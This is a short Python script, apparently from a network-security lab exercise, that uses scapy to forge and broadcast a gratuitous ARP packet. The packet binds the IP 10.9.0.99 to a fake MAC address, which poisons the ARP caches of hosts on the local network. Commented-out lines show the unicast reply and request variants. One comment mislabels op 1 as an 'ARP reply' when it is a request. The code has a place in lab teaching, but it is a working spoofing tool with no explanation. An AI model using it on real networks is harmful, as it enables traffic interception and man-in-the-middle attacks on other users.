#!/usr/bin/env python3
from scapy.all import *

IP_V = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T = "10.9.0.99"
MAC_T_fake = "aa:bb:cc:dd:ee:00"

#ether = Ether(src=MAC_T_fake, dst=MAC_V_real)
ether = Ether(src=MAC_T_fake, dst="ff:ff:ff:ff:ff:ff")


#arp = ARP(psrc=IP_T, hwsrc=MAC_T_fake, pdst=IP_V, hwdst=MAC_V_real)
#arp = ARP(psrc=IP_T, hwsrc=MAC_T_fake, pdst=IP_V)
arp = ARP(psrc=IP_T, hwsrc=MAC_T_fake, pdst=IP_T, hwdst="ff:ff:ff:ff:ff:ff")


#arp.op = 2 # ARP reply
arp.op = 1 # ARP reply

frame = ether/arp
sendp(frame)
